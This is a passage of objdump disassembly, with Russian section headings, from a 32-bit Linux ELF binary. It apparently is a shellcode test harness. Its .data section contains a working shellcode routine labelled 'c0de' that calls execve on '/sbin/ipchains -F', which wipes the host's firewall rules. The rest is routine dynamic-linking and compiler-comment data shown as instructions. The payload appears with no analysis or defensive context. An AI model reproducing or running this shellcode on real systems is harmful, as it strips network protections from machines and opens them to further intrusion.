 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	75 00                	jne    8049f6a <_DYNAMIC+0x56>
 8049f6a:	00 00                	add    %al,(%eax)
 8049f6c:	0b 00                	or     (%eax),%eax
 8049f6e:	00 00                	add    %al,(%eax)
 8049f70:	10 00                	adc    %al,(%eax)
 8049f72:	00 00                	add    %al,(%eax)
 8049f74:	15 00 00 00 00       	adc    $0x0,%eax
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	30 00                	xor    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 0c 83             	add    %cl,(%ebx,%eax,4)
 8049f9a:	04 08                	add    $0x8,%al
 8049f9c:	11 00                	adc    %eax,(%eax)
 8049f9e:	00 00                	add    %al,(%eax)
 8049fa0:	04 83                	add    $0x83,%al
 8049fa2:	04 08                	add    $0x8,%al
 8049fa4:	12 00                	adc    (%eax),%al
 8049fa6:	00 00                	add    %al,(%eax)
 8049fa8:	08 00                	or     %al,(%eax)
 8049faa:	00 00                	add    %al,(%eax)
 8049fac:	13 00                	adc    (%eax),%eax
 8049fae:	00 00                	add    %al,(%eax)
 8049fb0:	08 00                	or     %al,(%eax)
 8049fb2:	00 00                	add    %al,(%eax)
 8049fb4:	fe                   	(bad)  
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f d4             	ljmp   *-0x2c(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f c2             	ljmp   *-0x3e(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	76 83                	jbe    8049f91 <_DYNAMIC+0x7d>
 804a00e:	04 08                	add    $0x8,%al
 804a010:	86 83 04 08 96 83    	xchg   %al,-0x7c69f7fc(%ebx)
 804a016:	04 08                	add    $0x8,%al
 804a018:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
 804a019:	83 04 08 b6          	addl   $0xffffffb6,(%eax,%ecx,1)
 804a01d:	83 04 08 c6          	addl   $0xffffffc6,(%eax,%ecx,1)
 804a021:	83                   	.byte 0x83
 804a022:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a040 <__data_start>:
 804a040:	00 00                	add    %al,(%eax)
	...

0804a044 <__dso_handle>:
	...

0804a060 <c0de>:
 804a060:	83 ec 04             	sub    $0x4,%esp
 804a063:	5c                   	pop    %esp
 804a064:	31 d2                	xor    %edx,%edx
 804a066:	52                   	push   %edx
 804a067:	66 68 2d 46          	pushw  $0x462d
 804a06b:	89 e6                	mov    %esp,%esi
 804a06d:	52                   	push   %edx
 804a06e:	68 61 69 6e 73       	push   $0x736e6961
 804a073:	68 69 70 63 68       	push   $0x68637069
 804a078:	89 e7                	mov    %esp,%edi
 804a07a:	68 62 69 6e 2f       	push   $0x2f6e6962
 804a07f:	68 2f 2f 2f 73       	push   $0x732f2f2f
 804a084:	89 e3                	mov    %esp,%ebx
 804a086:	52                   	push   %edx
 804a087:	56                   	push   %esi
 804a088:	57                   	push   %edi
 804a089:	89 e1                	mov    %esp,%ecx
 804a08b:	31 c0                	xor    %eax,%eax
 804a08d:	b0 0b                	mov    $0xb,%al
 804a08f:	cd 80                	int    $0x80
	...

Дизассемблирование раздела .bss:

0804a092 <__bss_start>:
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x80482c4>
   a:	74 75                	je     81 <_init-0x80482bb>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x80482b6>
  18:	74 75                	je     8f <_init-0x80482ad>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x804829b>
  33:	74 75                	je     aa <_init-0x8048292>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x804828c>
  42:	74 75                	je     b9 <_init-0x8048283>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
